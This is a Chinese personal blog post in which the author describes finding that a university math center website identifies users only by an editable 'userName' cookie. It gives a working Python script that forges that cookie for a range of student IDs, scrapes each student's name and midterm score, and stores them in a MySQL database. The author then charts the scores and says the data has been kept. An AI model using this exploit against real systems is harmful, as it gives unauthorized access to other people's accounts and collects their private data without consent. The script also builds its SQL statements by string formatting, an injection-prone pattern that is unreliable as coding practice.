<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1" /><title>期中成绩爬虫</title><meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@XueZhonghao" /><meta name="twitter:title" content="期中成绩爬虫" /><meta name="twitter:description" content="背景"><meta name="description" content="背景"><meta name="google-site-verification" content="epFgX0s_0RM3CdjwFcsewfXzPov2g8s9ZBOLyaIUH-o"><link rel="shortcut icon" href="/assets/totora.png"> <!--<link rel="icon" href="/assets/totora.png">--><link rel="apple-touch-icon" href="/assets/touch-icon.png"><link rel="stylesheet" href="//code.cdn.mozilla.net/fonts/fira.css"><link rel="stylesheet" href="/assets/core.css"><link rel="stylesheet" href="/assets/prism.css"><link rel="canonical" href="/notes/mid-score"><link rel="alternate" type="application/atom+xml" title="AlanXue's blog" href="/feed.xml" /></head><body><aside class="logo"> <a href="/"> <img src="http://www.gravatar.com/avatar/742cf6353760888dd24b7f22843cca55.png?s=80" class="gravatar"> </a> <span class="logo-prompt">Back to Home</span></aside><main> <noscript><style> article .footnotes { display: block; }</style></noscript><article><div class="center"><h1>期中成绩爬虫</h1><time>May 7, 2016</time></div><div class="divider"></div><h2 id="section">背景</h2><p>今天进行了期中考试，考完之后看他们在查别人的成绩，一个一个的查真痛苦→_→，于是我就想，这不是正好这几天在尝试爬虫，那我就写个爬虫获取一下整个学院的人的成绩吧</p><div class="divider"></div><h2 id="section-1">过程</h2><p>本来还想着，这次可不是微博那种一个Cookie闯天下，得好好看看模拟登陆是怎么回事了，结果，之后我就惊呆了！</p><p>打开<a href="http://centermath.hit.edu.cn/">数学中心的网站</a>，登陆，看看Cookie，内容如下:</p><table><thead><tr><th>Name</th><th>Content</th></tr></thead><tbody><tr><td>CourseID</td><td>0</td></tr><tr><td>ASPSESSIONIDQABRRRSB</td><td>JEELCIDDJDFNHKEGNDJKJMOE</td></tr><tr><td>CWUserLogined</td><td>1</td></tr><tr><td>photo</td><td>boy%2Egif</td></tr><tr><td>trueName</td><td>%D1%A6%D6%D9%BA%C0</td></tr><tr><td>userKind</td><td>student</td></tr><tr><td>userName</td><td>115××××××6</td></tr></tbody></table><p>欸？貌似只有个userName可以认定这到底是谁登陆的啊，trueName是名字的gb2312码，这个应该作用不大，毕竟有重名。</p><p>真正需要的成绩信息是点击<strong>在线测试</strong>后得到那个网页，按F12，看看源码，这网址也是固定的，就是在<a href="http://centermath.hit.edu.cn/">数学中心网站</a>的后面加上“zxcs”，这名字起的，浓浓中国风啊(￣▽￣)”</p><p>我决定拿python获取一下这个在线测试的网页，获取的时候headers里直接加上cookie。就在此时，抱着试一试的心态，悄悄把cookie中的userName改成了115××××××7，获取网页，居然成功了！！！</p><p>我去，此刻我终于明白了为什么那么多人的爬虫都起步于学校的网站(⊙o⊙)，我就改一下数字就进入了别人的账号？？那密码根本就是搞笑的嘛，为因为忘记密码而影响考试的同学默哀。</p><p>既然网页都获取到了，剩下的步骤就很简单了，穷举学号，获取网页，正则提取成绩即可</p><div class="divider"></div><h2 id="section-2">代码</h2><p>代码是用python写的，其实爬虫我只会python，真的是不要太方便。</p><p>我还顺便把这些存到数据库里了，方便以后查询ˇ∀ˇ</p><div class="highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib.request</span>
<span class="kn">import</span> <span class="nn">mysql.connector</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="c">#Initialization</span>
<span class="k">print</span><span class="p">(</span><span class="s">'Initializing...'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
<span class="n">address</span> <span class="o">=</span> <span class="s">'http://centermath.hit.edu.cn/zxcs/'</span>
<span class="n">user_agent</span> <span class="o">=</span> <span class="s">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0'</span>
<span class="n">cookie_head</span> <span class="o">=</span> <span class="s">'CourseID=0; ASPSESSIONIDQABRRRSB=LGAKCIDDEBIJFFPDGLNNNHPI; CWUserLogined=1; photo=boy</span><span class="si">%2</span><span class="s">Egif; trueName=</span><span class="si">%</span><span class="s">C2</span><span class="si">%</span><span class="s">ED</span><span class="si">%</span><span class="s">C8</span><span class="si">%</span><span class="s">FC</span><span class="si">%</span><span class="s">BF</span><span class="si">%</span><span class="s">CB; userKind=student; userName='</span>
<span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">r'&lt;div class="regards"&gt;.*?：(.*?)&amp;.*?&lt;/div&gt;.*?&lt;a href="javascript:void</span><span class="err">\</span><span class="s">(0</span><span class="err">\</span><span class="s">)".*?&gt;(.*?)&lt;/a&gt;'</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[Done]'</span><span class="p">)</span>

<span class="c">#Database|MySQL</span>
<span class="k">print</span><span class="p">(</span><span class="s">'Connecting to the database...'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
<span class="n">conn</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">connector</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="s">'root'</span><span class="p">,</span> <span class="n">database</span><span class="o">=</span><span class="s">'samp_db'</span><span class="p">)</span>
<span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[Done]'</span><span class="p">)</span>

<span class="n">begin</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Input the begin:'</span><span class="p">))</span>
<span class="n">end</span>   <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Input  the  end:'</span><span class="p">))</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">begin</span><span class="p">,</span> <span class="n">end</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Request for ID:</span><span class="si">%</span><span class="s">d...'</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
    <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">((</span><span class="s">"select * from students where id = </span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="n">i</span><span class="p">))</span>
    <span class="n">ans</span> <span class="o">=</span> <span class="n">cur</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'[Exists](</span><span class="si">%</span><span class="s">s, </span><span class="si">%</span><span class="s">d)'</span> <span class="o">%</span> <span class="n">ans</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">:])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">cookie</span> <span class="o">=</span> <span class="n">cookie_head</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">'User-Agent'</span><span class="p">:</span> <span class="n">user_agent</span><span class="p">,</span>
            <span class="s">'Cookie'</span><span class="p">:</span> <span class="n">cookie</span><span class="p">,</span>
            <span class="p">}</span>
        <span class="n">request</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">URLError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="s">'code'</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">code</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="s">'reason'</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">reason</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">st</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'gb2312'</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'[Read Error]'</span><span class="p">)</span>
            <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">((</span><span class="s">"insert into students(id, name, score) values (</span><span class="si">%</span><span class="s">d, '</span><span class="si">%</span><span class="s">s', </span><span class="si">%</span><span class="s">s)"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s">'None'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)))</span>
            <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
            <span class="k">continue</span>            
        <span class="n">st</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">st</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">st</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
            <span class="n">st</span> <span class="o">=</span> <span class="n">st</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'[Done](</span><span class="si">%</span><span class="s">s, </span><span class="si">%</span><span class="s">s)'</span> <span class="o">%</span> <span class="n">st</span><span class="p">)</span>
            <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">((</span><span class="s">"insert into students(id, name, score) values (</span><span class="si">%</span><span class="s">d, '</span><span class="si">%</span><span class="s">s', </span><span class="si">%</span><span class="s">s)"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">st</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">st</span><span class="p">[</span><span class="mi">1</span><span class="p">])))</span>
            <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'[Not Found]'</span><span class="p">)</span>

<span class="n">cur</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

</code></pre></div><div class="divider"></div><h2 id="section-3">简单分析</h2><p>现在的学霸真是越来越多了，受不了的好吧，考个18分只是勉强过得去，16分排名就三位数了！→_→</p><p>凡是有成绩的同学，最低分8分，有7个人没有成绩，可能是旷考或者考的时候出问题了。</p><p><img src="/assets/mid_score1.jpg" /></p><p>上面这个图是来用<a href="http://raw.densitydesign.org/">Raw</a>制作出来的，看起来很高端，但貌似效果并不好。好吧，于是又做了一个简单粗暴，通俗易懂的柱状图&amp;折线图。</p><p><img src="/assets/mid_score2.png" /></p><p>至此，爬取同学们的成绩就结束了。（但数据我保留下来了，hiahia~）</p><div class="divider"></div></article><div class="back"> <a href="/">Back</a></div></main></body></html>